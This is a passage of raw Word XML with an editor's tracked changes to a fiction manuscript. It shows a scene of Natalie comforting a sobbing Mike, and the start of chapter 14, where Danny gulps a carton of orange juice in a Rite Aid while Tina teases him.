        <w:r w:rsidRPr="000D3488" w:rsidDel="00881F98">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>well</w:t>
      </w:r>
      <w:ins w:id="1675" w:author="TextVet" w:date="2016-03-19T14:28:00Z">
        <w:r w:rsidR="00881F98">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up with tears. “Natalie…” he said in a cracking voice. “I really don’t feel very brave right now. I don’t feel like a winner. I just feel like… I just…”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Natalie </w:t>
      </w:r>
      <w:ins w:id="1676" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidR="00BE5233">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>regarded him</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1677" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BE5233">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>watched his face with</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sympath</w:t>
      </w:r>
      <w:ins w:id="1678" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidR="00BE5233">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>eticall</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:ins w:id="1679" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidR="00764DEA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1680" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00764DEA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. She</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gently reached her arms around him</w:t>
      </w:r>
      <w:ins w:id="1681" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidR="00764DEA">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and pressed her head against his chest. “It’s okay,</w:t>
      </w:r>
      <w:del w:id="1682" w:author="TextVet" w:date="2016-03-19T14:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F492F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Mike,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">” she </w:t>
      </w:r>
      <w:ins w:id="1683" w:author="TextVet" w:date="2016-03-19T14:30:00Z">
        <w:r w:rsidR="00BC689E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>whispered</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1684" w:author="TextVet" w:date="2016-03-19T14:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC689E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said to hi</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1685" w:author="TextVet" w:date="2016-03-19T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC689E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>m quietly</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returned her embrace and bowed his head </w:t>
      </w:r>
      <w:del w:id="1686" w:author="TextVet" w:date="2016-03-19T14:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC4EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">down </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to rest </w:t>
      </w:r>
      <w:ins w:id="1687" w:author="TextVet" w:date="2016-03-19T14:31:00Z">
        <w:r w:rsidR="00FC4EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1688" w:author="TextVet" w:date="2016-03-19T14:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC4EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">on </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">top </w:t>
      </w:r>
      <w:del w:id="1689" w:author="TextVet" w:date="2016-03-19T14:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC4EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hers. His chest shook several times silently.</w:t>
      </w:r>
      <w:ins w:id="1690" w:author="TextVet" w:date="2016-03-19T14:32:00Z">
        <w:r w:rsidR="00F86366">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1691" w:author="TextVet" w:date="2016-03-19T14:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F86366">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> He gradually began to emit a</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1692" w:author="TextVet" w:date="2016-03-19T14:32:00Z">
        <w:r w:rsidR="00F86366">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> series of coughing sobs</w:t>
      </w:r>
      <w:ins w:id="1693" w:author="TextVet" w:date="2016-03-19T14:32:00Z">
        <w:r w:rsidR="00F86366">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> rumbled </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1694" w:author="TextVet" w:date="2016-03-19T14:33:00Z">
        <w:r w:rsidR="001E2E02">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>forth</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, each one longer than the last, until they joined in a long wail. Loud, wet, gasping inhal</w:t>
      </w:r>
      <w:ins w:id="1695" w:author="TextVet" w:date="2016-03-19T14:33:00Z">
        <w:r w:rsidR="008C7AE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ations</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1696" w:author="TextVet" w:date="2016-03-19T14:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C7AE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>es</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> punctuated his bawling.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okay, Mike</w:t>
      </w:r>
      <w:del w:id="1697" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DB240F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. It’s okay</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">,” Natalie </w:t>
      </w:r>
      <w:ins w:id="1698" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidR="00004318">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>repeated</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1699" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00004318">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said over and over</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1700" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidR="00004318">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1701" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00004318">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as she</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> h</w:t>
      </w:r>
      <w:ins w:id="1702" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidR="00004318">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1703" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00004318">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ld</w:t>
      </w:r>
      <w:ins w:id="1704" w:author="TextVet" w:date="2016-03-19T14:34:00Z">
        <w:r w:rsidR="00004318">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him tight. “Don’t be afraid to cry.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>14</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Tina watched the entire carton of Tropicana</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Orange Juice disappear down Danny’s gullet. He</w:t>
      </w:r>
      <w:ins w:id="1705" w:author="TextVet" w:date="2016-03-19T14:35:00Z">
        <w:r w:rsidR="005D3117">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grabbed it off the shelf </w:t>
      </w:r>
      <w:del w:id="1706" w:author="TextVet" w:date="2016-03-19T14:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A1678">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and nursed it </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">right there in the dairy section, </w:t>
      </w:r>
      <w:ins w:id="1707" w:author="TextVet" w:date="2016-03-19T14:37:00Z">
        <w:r w:rsidR="008A1678">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">nursing it, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>taking multi-gulp swigs and pausing only to come up for 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“You did </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1708" w:author="TextVet" w:date="2016-03-19T14:38:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> just chug that whole thing, did you?”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“Oh man, that hit the spot,” Danny </w:t>
      </w:r>
      <w:del w:id="1709" w:author="TextVet" w:date="2016-03-19T14:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0083316F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">said with a contented </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sigh</w:t>
      </w:r>
      <w:ins w:id="1710" w:author="TextVet" w:date="2016-03-19T14:39:00Z">
        <w:r w:rsidR="0083316F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ed, </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1711" w:author="TextVet" w:date="2016-03-19T14:40:00Z">
        <w:r w:rsidR="00476125">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>his need</w:t>
        </w:r>
        <w:r w:rsidR="0083316F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1712" w:author="TextVet" w:date="2016-03-19T14:39:00Z">
        <w:r w:rsidR="0083316F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>slaked</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He wiped his mouth with the sleeve of Natalie’s oversized floral-print sweatshirt. He scanned the brightly</w:t>
      </w:r>
      <w:ins w:id="1713" w:author="TextVet" w:date="2016-03-19T14:41:00Z">
        <w:r w:rsidR="004D78AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1714" w:author="TextVet" w:date="2016-03-19T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004D78AD">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lit aisles of the Rite Aid, absent-mindedly handed the empty carton to Tina, and made a bee-line for a promotional display of Clif Bars near the checkout counters.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thing is sixty ounces!” said Tina, reading the carton’s labeling as she followed.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“Mm-hmm,” said Danny dismissively as he tore into a Clif Crunchy Peanut Butter.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normal human bladder can only hold like twenty.”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shrugged.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do realize,” she pointed out, “that you’re going to piss your pants in five… four… three…”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“Can’t pee right now,” he said with his mouth full. “Too busy eating.” He finished his snack in a second</w:t>
      </w:r>
      <w:del w:id="1715" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A33CD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1716" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidR="003A33CD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1717" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A33CD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> grabbed two more bars from the display</w:t>
      </w:r>
      <w:ins w:id="1718" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidR="00A02464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1719" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A02464">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720" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidR="003A33CD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">and </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1721" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A02464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">He </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">held </w:t>
      </w:r>
      <w:del w:id="1722" w:author="TextVet" w:date="2016-03-19T14:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF098A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">them </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">up </w:t>
      </w:r>
      <w:ins w:id="1723" w:author="TextVet" w:date="2016-03-19T14:44:00Z">
        <w:r w:rsidR="00DF098A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
